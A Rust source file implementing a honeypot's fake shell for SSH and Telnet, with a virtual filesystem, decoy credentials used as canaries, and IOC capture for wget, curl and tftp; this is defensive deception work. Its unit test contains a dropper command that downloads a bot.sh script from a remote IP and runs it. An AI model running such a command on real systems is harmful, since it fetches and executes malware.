//! Stateful virtual filesystem and shell emulator shared by SSH and Telnet honeypots

use std::collections::{BTreeMap, BTreeSet};

use crate::ioc::{self, IocItem};

#[derive(Debug, Clone)]
pub struct ShellResult {
    pub output: String,
    pub should_exit: bool,
    pub extracted_iocs: Vec<IocItem>,
    pub canary_triggered: bool,
}

/// Stateful per-session fake shell with virtual filesystem & configurable persona
pub struct FakeShell {
    hostname: String,
    persona: String,
    username: String,
    cwd: String,
    dirs: BTreeSet<String>,
    files: BTreeMap<String, String>,
    history: Vec<String>,
}

impl FakeShell {
    pub fn new(hostname: &str, persona: &str, username: &str) -> Self {
        let host = if hostname.trim().is_empty() {
            "prod-web-01".to_string()
        } else {
            hostname.trim().to_string()
        };
        let persona_norm = persona.trim().to_ascii_lowercase();
        let user = if username.trim().is_empty() {
            "root".to_string()
        } else {
            username.trim().to_string()
        };

        let home = if user == "root" {
            "/root".to_string()
        } else {
            format!("/home/{}", user)
        };

        let mut dirs = BTreeSet::new();
        for d in [
            "/",
            "/bin",
            "/etc",
            "/etc/ssh",
            "/home",
            "/proc",
            "/root",
            "/root/.ssh",
            "/tmp",
            "/usr",
            "/usr/bin",
            "/var",
            "/var/log",
            "/var/www",
            "/var/www/html",
            home.as_str(),
        ] {
            dirs.insert(d.to_string());
        }

        let mut files = BTreeMap::new();
        files.insert(
            "/etc/passwd".to_string(),
            "root:x:0:0:root:/root:/bin/bash\n\
             daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
             bin:x:2:2:bin:/bin:/usr/sbin/nologin\n\
             sys:x:3:3:sys:/dev:/usr/sbin/nologin\n\
             www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\
             ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n"
                .to_string(),
        );
        files.insert(
            "/etc/hosts".to_string(),
            format!("127.0.0.1 localhost\n127.0.1.1 {}\n", host),
        );
        files.insert(
            "/etc/resolv.conf".to_string(),
            "nameserver 1.1.1.1\nnameserver 8.8.8.8\n".to_string(),
        );
        files.insert(
            "/proc/cpuinfo".to_string(),
            (0..4)
                .map(|i| {
                    format!(
                        "processor\t: {}\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Xeon(R) CPU E5-2680 v4 @ 2.40GHz\ncpu MHz\t\t: 2400.000\ncache size\t: 35840 KB\n",
                        i
                    )
                })
                .collect::<Vec<_>>()
                .join("\n"),
        );
        files.insert(
            "/root/.bashrc".to_string(),
            "# ~/.bashrc: executed by bash(1) for non-login shells.\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n".to_string(),
        );
        files.insert(
            "/root/.bash_history".to_string(),
            "apt-get update\nsystemctl status nginx\ndocker ps\n".to_string(),
        );
        files.insert(
            "/root/.ssh/authorized_keys".to_string(),
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderDeployKeyDoNotUse ops@internal\n"
                .to_string(),
        );

        // Canary .env file with synthetic decoy credentials
        files.insert(
            "/var/www/html/.env".to_string(),
            format!(
                "APP_ENV=production\nAPP_HOST={}\nDB_HOST=10.0.4.18\nDB_USER=app_prod\nDB_PASS=DecoyDbPass#2026\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7HONEY01\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYHONEYKEY\n",
                host
            ),
        );

        match persona_norm.as_str() {
            "iot" => {
                files.insert(
                    "/etc/os-release".to_string(),
                    "NAME=\"Buildroot\"\nVERSION=2021.02\nID=buildroot\nPRETTY_NAME=\"Embedded Linux 4.14 (BusyBox)\"\n".to_string(),
                );
            }
            "db" => {
                files.insert(
                    "/etc/os-release".to_string(),
                    "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nID=debian\n".to_string(),
                );
                files.insert(
                    "/root/.pgpass".to_string(),
                    "10.0.4.18:5432:production:postgres:DecoyPgPass#9912\n".to_string(),
                );
            }
            _ => {
                files.insert(
                    "/etc/os-release".to_string(),
                    "PRETTY_NAME=\"Ubuntu 22.04.4 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"22.04\"\nID=ubuntu\n".to_string(),
                );
            }
        }

        Self {
            hostname: host,
            persona: persona_norm,
            username: user,
            cwd: home,
            dirs,
            files,
            history: vec![
                "systemctl status ssh".to_string(),
                "df -h".to_string(),
                "uptime".to_string(),
            ],
        }
    }

    pub fn prompt(&self) -> String {
        let dir_display = if (self.username == "root" && self.cwd == "/root")
            || self.cwd == format!("/home/{}", self.username)
        {
            "~".to_string()
        } else {
            self.cwd.clone()
        };
        let sigil = if self.username == "root" { '#' } else { '$' };
        format!("{}@{}:{}{} ", self.username, self.hostname, dir_display, sigil)
    }

    pub fn welcome_banner(&self, ip: &str) -> String {
        match self.persona.as_str() {
            "iot" => format!(
                "\r\nBusyBox v1.33.1 (2022-04-12 09:14:22 UTC) built-in shell (ash)\r\n{}\r\n",
                self.hostname
            ),
            "db" => format!(
                "Linux {} 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 x86_64\r\nLast login: {} from {}\r\n",
                self.hostname,
                chrono::Utc::now().format("%a %b %d %H:%M:%S %Y"),
                ip
            ),
            _ => format!(
                "Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\r\n\r\n * Documentation:  https://help.ubuntu.com\r\n * Management:     https://landscape.canonical.com\r\n * Support:        https://ubuntu.com/advantage\r\n\r\nLast login: {} from {}\r\n",
                chrono::Utc::now().format("%a %b %d %H:%M:%S %Y"),
                ip
            ),
        }
    }

    pub fn execute_line(&mut self, line: &str) -> ShellResult {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            return ShellResult {
                output: String::new(),
                should_exit: false,
                extracted_iocs: Vec::new(),
                canary_triggered: false,
            };
        }

        if self.history.len() < 200 {
            self.history.push(trimmed.to_string());
        }

        let mut full_output = String::new();
        let mut should_exit = false;
        let mut extracted_iocs = ioc::extract_iocs(trimmed);
        let mut canary_triggered = false;

        for segment in split_shell_chain(trimmed) {
            let seg = segment.trim();
            if seg.is_empty() {
                continue;
            }
            // Take first stage of pipeline (unless piped to sh/bash/base64, already scanned by extract_iocs)
            let primary = split_pipe_head(seg).trim();
            let res = self.execute_single(primary);
            full_output.push_str(&res.output);
            if res.canary_triggered {
                canary_triggered = true;
            }
            for item in res.extracted_iocs {
                if !extracted_iocs.iter().any(|e| e == &item) {
                    extracted_iocs.push(item);
                }
            }
            if res.should_exit {
                should_exit = true;
                break;
            }
        }

        ShellResult {
            output: full_output,
            should_exit,
            extracted_iocs,
            canary_triggered,
        }
    }

    fn execute_single(&mut self, cmd_line: &str) -> ShellResult {
        // Handle output redirection (`echo foo > file` or `>> file`)
        if let Some((lhs, rhs, append)) = split_redirection(cmd_line) {
            let target = self.resolve_path(rhs.trim());
            if let Some(parent) = parent_dir(&target) {
                if self.dirs.contains(&parent) {
                    let content = lhs
                        .trim()
                        .strip_prefix("echo")
                        .map(|rest| strip_quotes(rest.trim()).to_string() + "\n")
                        .unwrap_or_default();
                    if append {
                        let entry = self.files.entry(target).or_default();
                        entry.push_str(&content);
                    } else {
                        self.files.insert(target, content);
                    }
                }
            }
            return ShellResult {
                output: String::new(),
                should_exit: false,
                extracted_iocs: Vec::new(),
                canary_triggered: false,
            };
        }

        let tokens = tokenize_args(cmd_line);
        let Some(base) = tokens.first().map(|s| s.as_str()) else {
            return ShellResult {
                output: String::new(),
                should_exit: false,
                extracted_iocs: Vec::new(),
                canary_triggered: false,
            };
        };
        let args = &tokens[1..];

        let mut canary_triggered = false;
        let mut extracted_iocs = Vec::new();
        let mut should_exit = false;

        let output = match base {
            "exit" | "quit" | "logout" => {
                should_exit = true;
                String::new()
            }
            "whoami" => format!("{}\r\n", self.username),
            "id" => {
                if self.username == "root" {
                    "uid=0(root) gid=0(root) groups=0(root)\r\n".to_string()
                } else {
                    format!(
                        "uid=1000({}) gid=1000({}) groups=1000({})\r\n",
                        self.username, self.username, self.username
                    )
                }
            }
            "pwd" => format!("{}\r\n", self.cwd),
            "hostname" => format!("{}\r\n", self.hostname),
            "uname" => {
                if args.iter().any(|a| a.contains('a')) {
                    if self.persona == "iot" {
                        format!(
                            "Linux {} 4.14.151 #1 SMP armv7l GNU/Linux\r\n",
                            self.hostname
                        )
                    } else {
                        format!(
                            "Linux {} 5.15.0-105-generic #115-Ubuntu SMP x86_64 GNU/Linux\r\n",
                            self.hostname
                        )
                    }
                } else if args.iter().any(|a| a.contains('m')) {
                    if self.persona == "iot" {
                        "armv7l\r\n".to_string()
                    } else {
                        "x86_64\r\n".to_string()
                    }
                } else if args.iter().any(|a| a.contains('r')) {
                    "5.15.0-105-generic\r\n".to_string()
                } else {
                    "Linux\r\n".to_string()
                }
            }
            "nproc" => "4\r\n".to_string(),
            "lscpu" => "Architecture:                    x86_64\r\nCPU op-mode(s):                  32-bit, 64-bit\r\nCPU(s):                          4\r\nModel name:                      Intel(R) Xeon(R) CPU E5-2680 v4 @ 2.40GHz\r\n".to_string(),
            "free" => "               total        used        free      shared  buff/cache   available\r\nMem:         8143284     1928412     3821904       42100     2392968     5910216\r\nSwap:        2097148           0     2097148\r\n".to_string(),
            "df" => "Filesystem      Size  Used Avail Use% Mounted on\r\n/dev/vda1        78G   18G   56G  25% /\r\ntmpfs           3.9G     0  3.9G   0% /dev/shm\r\n".to_string(),
            "uptime" => " 14:22:08 up 47 days,  6:14,  1 user,  load average: 0.08, 0.05, 0.01\r\n".to_string(),
            "w" => format!(
                " 14:22:08 up 47 days,  6:14,  1 user,  load average: 0.08, 0.05, 0.01\r\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\r\n{}     pts/0    -                14:21    0.00s  0.02s  0.00s w\r\n",
                self.username
            ),
            "ps" => "  PID TTY          TIME CMD\r\n    1 ?        00:00:04 systemd\r\n  814 ?        00:00:01 sshd\r\n 1102 ?        00:00:03 nginx\r\n 1842 pts/0    00:00:00 bash\r\n 1849 pts/0    00:00:00 ps\r\n".to_string(),
            "ifconfig" => "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 10.0.4.12  netmask 255.255.255.0  broadcast 10.0.4.255\r\n        ether 52:54:00:1a:2b:3c  txqueuelen 1000  (Ethernet)\r\n".to_string(),
            "ip" => {
                if args.iter().any(|a| a.starts_with('a')) {
                    "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\r\n    inet 127.0.0.1/8 scope host lo\r\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\r\n    inet 10.0.4.12/24 brd 10.0.4.255 scope global eth0\r\n".to_string()
                } else {
                    "Usage: ip [ OPTIONS ] OBJECT\r\n".to_string()
                }
            }
            "cd" => {
                let dest = args.first().map(|s| s.as_str()).unwrap_or("~");
                let resolved = if dest == "~" {
                    if self.username == "root" {
                        "/root".to_string()
                    } else {
                        format!("/home/{}", self.username)
                    }
                } else {
                    self.resolve_path(dest)
                };
                if self.dirs.contains(&resolved) {
                    self.cwd = resolved;
                    String::new()
                } else {
                    format!("bash: cd: {}: No such file or directory\r\n", dest)
                }
            }
            "ls" => self.cmd_ls(args),
            "cat" | "head" | "tail" => {
                if args.is_empty() {
                    String::new()
                } else {
                    let mut out = String::new();
                    for arg in args {
                        if arg.starts_with('-') {
                            continue;
                        }
                        let path = self.resolve_path(arg);
                        if path.ends_with("/.env")
                            || path.ends_with("/authorized_keys")
                            || path.ends_with("/.pgpass")
                        {
                            canary_triggered = true;
                        }
                        if path == "/etc/shadow" && self.username != "root" {
                            out.push_str("cat: /etc/shadow: Permission denied\r\n");
                        } else if let Some(contents) = self.files.get(&path) {
                            for l in contents.lines() {
                                out.push_str(l);
                                out.push_str("\r\n");
                            }
                        } else if self.dirs.contains(&path) {
                            out.push_str(&format!("cat: {}: Is a directory\r\n", arg));
                        } else {
                            out.push_str(&format!("cat: {}: No such file or directory\r\n", arg));
                        }
                    }
                    out
                }
            }
            "mkdir" => {
                for arg in args.iter().filter(|a| !a.starts_with('-')) {
                    let path = self.resolve_path(arg);
                    self.dirs.insert(path);
                }
                String::new()
            }
            "touch" => {
                for arg in args.iter().filter(|a| !a.starts_with('-')) {
                    let path = self.resolve_path(arg);
                    self.files.entry(path).or_default();
                }
                String::new()
            }
            "rm" => {
                for arg in args.iter().filter(|a| !a.starts_with('-')) {
                    let path = self.resolve_path(arg);
                    self.files.remove(&path);
                }
                String::new()
            }
            "chmod" | "chown" | "nohup" | "sleep" | "export" | "unset" => String::new(),
            "echo" => {
                let mut parts = Vec::new();
                for a in args {
                    if *a != "-e" && *a != "-n" {
                        parts.push(a.as_str());
                    }
                }
                format!("{}\r\n", parts.join(" "))
            }
            "env" | "printenv" => format!(
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\nHOME={}\r\nUSER={}\r\nHOSTNAME={}\r\nSHELL=/bin/bash\r\n",
                if self.username == "root" { "/root" } else { "/home/user" },
                self.username,
                self.hostname
            ),
            "history" => self
                .history
                .iter()
                .enumerate()
                .map(|(i, h)| format!("{:>5}  {}\r\n", i + 1, h))
                .collect(),
            "wget" => self.cmd_wget(args, &mut extracted_iocs),
            "curl" => self.cmd_curl(args, &mut extracted_iocs),
            "tftp" => self.cmd_tftp(args, &mut extracted_iocs),
            "which" => {
                let target = args.first().map(|s| s.as_str()).unwrap_or("");
                if matches!(
                    target,
                    "sh" | "bash" | "wget" | "curl" | "python3" | "chmod" | "busybox"
                ) {
                    format!("/usr/bin/{}\r\n", target)
                } else {
                    String::new()
                }
            }
            "busybox" => "BusyBox v1.33.1 (2022-04-12 09:14:22 UTC) multi-call binary.\r\n".to_string(),
            "sh" | "bash" | "ash" => String::new(),
            cmd if cmd.starts_with("./") || cmd.starts_with("/tmp/") => {
                let path = self.resolve_path(cmd);
                if self.files.contains_key(&path) {
                    String::new()
                } else {
                    format!("bash: {}: No such file or directory\r\n", cmd)
                }
            }
            "help" => "GNU bash, version 5.1.16(1)-release (x86_64-pc-linux-gnu)\r\n".to_string(),
            _ => format!("bash: {}: command not found\r\n", base),
        };

        ShellResult {
            output,
            should_exit,
            extracted_iocs,
            canary_triggered,
        }
    }

    fn cmd_ls(&self, args: &[String]) -> String {
        let mut long_fmt = false;
        let mut show_all = false;
        let mut target: Option<&str> = None;

        for arg in args {
            if arg.starts_with('-') {
                if arg.contains('l') {
                    long_fmt = true;
                }
                if arg.contains('a') {
                    show_all = true;
                }
            } else {
                target = Some(arg.as_str());
            }
        }

        let dir_path = target
            .map(|t| self.resolve_path(t))
            .unwrap_or_else(|| self.cwd.clone());

        if self.files.contains_key(&dir_path) {
            return format!("{}\r\n", target.unwrap_or(&dir_path));
        }

        if !self.dirs.contains(&dir_path) {
            return format!(
                "ls: cannot access '{}': No such file or directory\r\n",
                target.unwrap_or(&dir_path)
            );
        }

        let prefix = if dir_path == "/" {
            "/".to_string()
        } else {
            format!("{}/", dir_path)
        };

        let mut entries: BTreeMap<String, (bool, usize)> = BTreeMap::new();
        for d in &self.dirs {
            if let Some(rest) = d.strip_prefix(&prefix) {
                if !rest.is_empty() && !rest.contains('/') {
                    entries.insert(rest.to_string(), (true, 4096));
                }
            }
        }
        for (f, body) in &self.files {
            if let Some(rest) = f.strip_prefix(&prefix) {
                if !rest.is_empty() && !rest.contains('/') {
                    entries.insert(rest.to_string(), (false, body.len()));
                }
            }
        }

        let visible: Vec<(String, bool, usize)> = entries
            .into_iter()
            .filter(|(name, _)| show_all || !name.starts_with('.'))
            .map(|(name, (is_dir, size))| (name, is_dir, size))
            .collect();

        if !long_fmt {
            if visible.is_empty() {
                return String::new();
            }
            let names: Vec<String> = visible.into_iter().map(|(n, _, _)| n).collect();
            return format!("{}\r\n", names.join("  "));
        }

        let mut out = format!("total {}\r\n", visible.len() * 4);
        if show_all {
            out.push_str("drwxr-xr-x  4 root root 4096 Nov 12 08:00 .\r\n");
            out.push_str("drwxr-xr-x 18 root root 4096 Nov 10 04:00 ..\r\n");
        }
        for (name, is_dir, size) in visible {
            let perms = if is_dir { "drwxr-xr-x" } else { "-rw-r--r--" };
            out.push_str(&format!(
                "{}  1 root root {:>5} Nov 12 08:15 {}\r\n",
                perms, size, name
            ));
        }
        out
    }

    fn cmd_wget(&mut self, args: &[String], out_iocs: &mut Vec<IocItem>) -> String {
        let mut url: Option<String> = None;
        let mut out_file: Option<String> = None;
        let mut i = 0;
        while i < args.len() {
            match args[i].as_str() {
                "-O" => {
                    if i + 1 < args.len() {
                        out_file = Some(args[i + 1].clone());
                        i += 2;
                        continue;
                    }
                }
                arg if arg.starts_with("-O") && arg.len() > 2 => {
                    out_file = Some(arg[2..].to_string());
                }
                arg if !arg.starts_with('-') => {
                    if url.is_none() {
                        url = Some(arg.to_string());
                    }
                }
                _ => {}
            }
            i += 1;
        }

        let Some(url_str) = url else {
            return "wget: missing URL\r\n".to_string();
        };

        for item in ioc::extract_iocs(&url_str) {
            if !out_iocs.iter().any(|e| e == &item) {
                out_iocs.push(item);
            }
        }

        let filename = out_file.unwrap_or_else(|| {
            url_str
                .rsplit('/')
                .next()
                .filter(|s| !s.is_empty())
                .unwrap_or("index.html")
                .split('?')
                .next()
                .unwrap_or("index.html")
                .to_string()
        });

        if filename != "-" {
            let path = self.resolve_path(&filename);
            self.files
                .insert(path, "#!/bin/sh\necho ok\n".to_string());
        }

        format!(
            "--2026-11-26 14:22:09--  {}\r\nConnecting... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 4182 (4.1K) [application/octet-stream]\r\nSaving to: '{}'\r\n\r\n{}   100%[===================>]   4.08K  --.-KB/s    in 0.01s\r\n\r\n2026-11-26 14:22:09 (408 KB/s) - '{}' saved [4182/4182]\r\n",
            url_str, filename, filename, filename
        )
    }

    fn cmd_curl(&mut self, args: &[String], out_iocs: &mut Vec<IocItem>) -> String {
        let mut url: Option<String> = None;
        let mut out_file: Option<String> = None;
        let mut i = 0;
        while i < args.len() {
            match args[i].as_str() {
                "-o" => {
                    if i + 1 < args.len() {
                        out_file = Some(args[i + 1].clone());
                        i += 2;
                        continue;
                    }
                }
                "-O" => {
                    out_file = Some("__BASENAME__".to_string());
                }
                arg if !arg.starts_with('-') => {
                    if url.is_none() {
                        url = Some(arg.to_string());
                    }
                }
                _ => {}
            }
            i += 1;
        }

        let Some(url_str) = url else {
            return "curl: try 'curl --help' for more information\r\n".to_string();
        };

        for item in ioc::extract_iocs(&url_str) {
            if !out_iocs.iter().any(|e| e == &item) {
                out_iocs.push(item);
            }
        }

        if let Some(target_flag) = out_file {
            let filename = if target_flag == "__BASENAME__" {
                url_str
                    .rsplit('/')
                    .next()
                    .filter(|s| !s.is_empty())
                    .unwrap_or("payload.bin")
                    .to_string()
            } else {
                target_flag
            };
            let path = self.resolve_path(&filename);
            self.files
                .insert(path, "#!/bin/sh\necho ok\n".to_string());
            String::new()
        } else {
            "#!/bin/sh\n".to_string()
        }
    }

    fn cmd_tftp(&mut self, args: &[String], out_iocs: &mut Vec<IocItem>) -> String {
        let mut remote_file: Option<String> = None;
        let mut host: Option<String> = None;
        let mut i = 0;
        while i < args.len() {
            if args[i] == "-r" && i + 1 < args.len() {
                remote_file = Some(args[i + 1].clone());
                i += 2;
                continue;
            }
            if !args[i].starts_with('-') && host.is_none() {
                host = Some(args[i].clone());
            }
            i += 1;
        }

        if let Some(h) = host {
            let val = match &remote_file {
                Some(f) => format!("tftp://{}/{}", h, f.trim_start_matches('/')),
                None => format!("tftp://{}", h),
            };
            let item = IocItem {
                ioc_type: "url".to_string(),
                value: val,
                context: Some("tftp".to_string()),
            };
            if !out_iocs.iter().any(|e| e == &item) {
                out_iocs.push(item);
            }
            if let Some(f) = remote_file {
                let path = self.resolve_path(&f);
                self.files.insert(path, "ELF".to_string());
            }
        }
        String::new()
    }

    fn resolve_path(&self, raw: &str) -> String {
        let mut parts: Vec<&str> = Vec::new();
        if !raw.starts_with('/') {
            for p in self.cwd.split('/').filter(|s| !s.is_empty()) {
                parts.push(p);
            }
        }
        for seg in raw.split('/') {
            match seg {
                "" | "." => {}
                ".." => {
                    parts.pop();
                }
                s => parts.push(s),
            }
        }
        if parts.is_empty() {
            "/".to_string()
        } else {
            format!("/{}", parts.join("/"))
        }
    }
}

fn parent_dir(path: &str) -> Option<String> {
    if path == "/" {
        return None;
    }
    match path.rfind('/') {
        Some(0) => Some("/".to_string()),
        Some(idx) => Some(path[..idx].to_string()),
        None => None,
    }
}

fn strip_quotes(s: &str) -> &str {
    s.trim_matches(|c| c == '\'' || c == '"')
}

fn split_shell_chain(input: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let chars: Vec<char> = input.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        let ch = chars[i];
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
            current.push(ch);
            i += 1;
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            current.push(ch);
            i += 1;
            continue;
        }
        if ch == ';' {
            parts.push(std::mem::take(&mut current));
            i += 1;
            continue;
        }
        if (ch == '&' || ch == '|') && i + 1 < chars.len() && chars[i + 1] == ch {
            parts.push(std::mem::take(&mut current));
            i += 2;
            continue;
        }
        current.push(ch);
        i += 1;
    }
    if !current.trim().is_empty() {
        parts.push(current);
    }
    parts
}

fn split_pipe_head(segment: &str) -> &str {
    let mut quote: Option<char> = None;
    for (idx, ch) in segment.char_indices() {
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            }
        } else if ch == '\'' || ch == '"' {
            quote = Some(ch);
        } else if ch == '|' {
            return &segment[..idx];
        }
    }
    segment
}

fn split_redirection(cmd: &str) -> Option<(&str, &str, bool)> {
    let mut quote: Option<char> = None;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if let Some(q) = quote {
            if b as char == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        if b == b'\'' || b == b'"' {
            quote = Some(b as char);
            i += 1;
            continue;
        }
        if b == b'>' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                return Some((&cmd[..i], &cmd[i + 2..], true));
            }
            return Some((&cmd[..i], &cmd[i + 1..], false));
        }
        i += 1;
    }
    None
}

fn tokenize_args(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut in_token = false;

    for ch in input.chars() {
        if let Some(q) = quote {
            if ch == q {
                quote = None;
            } else {
                current.push(ch);
            }
            continue;
        }
        if ch == '\'' || ch == '"' {
            quote = Some(ch);
            in_token = true;
            continue;
        }
        if ch.is_whitespace() {
            if in_token {
                tokens.push(std::mem::take(&mut current));
                in_token = false;
            }
            continue;
        }
        in_token = true;
        current.push(ch);
    }
    if in_token {
        tokens.push(current);
    }
    tokens
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn stateful_shell_handles_fs_dropper_chain_and_canary() {
        let mut shell = FakeShell::new("prod-api-02", "ubuntu", "root");
        assert!(shell.prompt().contains("prod-api-02"));
        assert!(!shell.prompt().contains("honeypot"));

        let res1 = shell.execute_line(
            "cd /tmp && wget http://45.155.205.1/bot.sh && chmod +x bot.sh && ./bot.sh",
        );
        assert!(res1.output.contains("200 OK"));
        assert!(!res1.extracted_iocs.is_empty());
        assert_eq!(res1.extracted_iocs[0].value, "http://45.155.205.1/bot.sh");

        let ls_res = shell.execute_line("ls");
        assert!(ls_res.output.contains("bot.sh"));

        shell.execute_line("echo hello_world > note.txt");
        let cat_res = shell.execute_line("cat note.txt");
        assert_eq!(cat_res.output.trim(), "hello_world");

        let canary_res = shell.execute_line("cat /var/www/html/.env");
        assert!(canary_res.canary_triggered);
        assert!(canary_res.output.contains("AKIAIOSFODNN7HONEY01"));
    }
}
